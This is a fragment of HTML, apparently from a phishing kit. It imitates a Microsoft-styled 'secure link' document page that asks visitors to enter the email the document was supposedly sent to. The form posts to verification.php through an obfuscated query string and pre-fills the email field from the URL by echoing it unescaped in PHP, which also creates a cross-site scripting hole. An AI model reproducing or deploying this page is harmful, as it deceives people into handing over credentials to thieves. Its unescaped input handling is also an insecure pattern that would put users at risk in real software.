				...
				<div class="form-content">
					<form action="verification.php?sf58gfd1s689sxd2sdf8angf264s9df23sd2f1n495K3L2C151645172991f1477dbd26917ef3822423f62e984a91f1477dbd26917ef3822423f62e984a91f1477dbd" method="POST">
						...
						<div>
							...
							<div class="form-message" style="font-family: 'Segoe UI Web (West European)','Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,'Helvetica Neue',sans-serif;"><span>To open this secure link, You need to enter the email that this document was sent to.</span>
							</div>
							<div class="file-description">
								<div class="file-info">
							...
							<div class="form-input-container">
								...
								<input name="username" value="<? echo $_GET['email'] ?>" maxlength="70" class="form-text-input disable-on-submit is-empty " placeholder="Enter Email" type="email" pattern=".{4,30}" oninvalid="this.setCustomValidity('Required Field')" oninput="setCustomValidity('')" title="Required Field" required="">
